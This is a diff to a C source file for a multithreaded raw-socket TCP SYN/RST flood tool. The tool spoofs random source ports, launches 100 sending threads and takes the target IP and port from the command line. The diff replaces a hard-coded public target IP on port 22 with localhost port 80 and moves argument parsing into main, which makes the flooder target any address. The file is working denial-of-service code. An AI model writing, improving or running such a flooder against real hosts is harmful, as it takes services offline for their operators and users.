@@ -14,9 +14,8 @@
 #include <unistd.h>
 #include <pthread.h>
 
-#define DEFULT_IP "34.152.44.128"
-#define DEFULT_PORT 22
-
+#define DEFULT_IP "127.0.0.1"
+#define DEFULT_PORT 80
 int countOfPacket = 0;
 int sending = 1;  
 char source_ip[32];
@@ -31,6 +30,12 @@ struct pseudo_header // for checksum calculation
 
   struct tcphdr tcp;
 };
+
+int destination_port = DEFULT_PORT;
+char destination_ip[32] = DEFULT_IP;
+int flagRst = 0;
+int flagSyn = 1;
+int opt = 0;
 
 // random number for port spoofing(0-65535)
 int randomPort() { return rand() % 65535; }
@@ -87,42 +92,7 @@ unsigned short checksum(unsigned short *ptr, int nbytes) {
   return (ans);
 }
 
-void *thread_routine (void *arg) {
-
-  int destination_port = DEFULT_PORT;
-  char destination_ip[32] = DEFULT_IP;
-  int flagRst = 0;
-  int flagSyn = 1;
-  //int opt = 0;
-
-  srand(time(0));                // gives the random function a new seed
-  signal(SIGINT, sigintHandler); // send interrupt for  Ctrl+C command
-
-  /*while ((opt = getopt(argc, argv, "t:p:r")) != -1) {
-    switch (opt) {
-    case 't':
-      strcpy(destination_ip, optarg);
-      if (!validIp(destination_ip)) {
-        printf("[ERROR] invalid ip - Program terminated\n");
-        exit(1);
-      }
-      break;
-    case 'p':
-      destination_port = strtol(optarg, NULL, 10);
-      if (destination_port < 0 || destination_port > 65535) {
-        printf("[ERROR] invalid port - Program terminated\n");
-        exit(1);
-      }
-      break;
-    case 'r':
-      flagRst = 1;
-      flagSyn = 0;
-      break;
-    default:
-      printf("[ERROR] Program terminated\n");
-      exit(1);
-    }
-  }*/
+void *thread_routine () {
 
   printf("[DATA] Flood is starting...\n");
 
@@ -233,6 +203,36 @@ void *thread_routine (void *arg) {
 int main(int argc, char *argv[]) {
   
   pthread_t threads[100];
+
+  srand(time(0));                // gives the random function a new seed
+  signal(SIGINT, sigintHandler); // send interrupt for  Ctrl+C command
+
+  while ((opt = getopt(argc, argv, "t:p:r")) != -1) {
+    switch (opt) {
+    case 't':
+      strcpy(destination_ip, optarg);
+      if (!validIp(destination_ip)) {
+        printf("[ERROR] invalid ip - Program terminated\n");
+        exit(1);
+      }
+      break;
+    case 'p':
+      destination_port = strtol(optarg, NULL, 10);
+      if (destination_port < 0 || destination_port > 65535) {
+        printf("[ERROR] invalid port - Program terminated\n");
+        exit(1);
+      }
+      break;
+    case 'r':
+      flagRst = 1;
+      flagSyn = 0;
+      break;
+    default:
+      printf("[ERROR] Program terminated\n");
+      exit(1);
+    }
+  }
+
   int value = 1;
   for (uint32_t i = 0; i < 100; i++)
   {
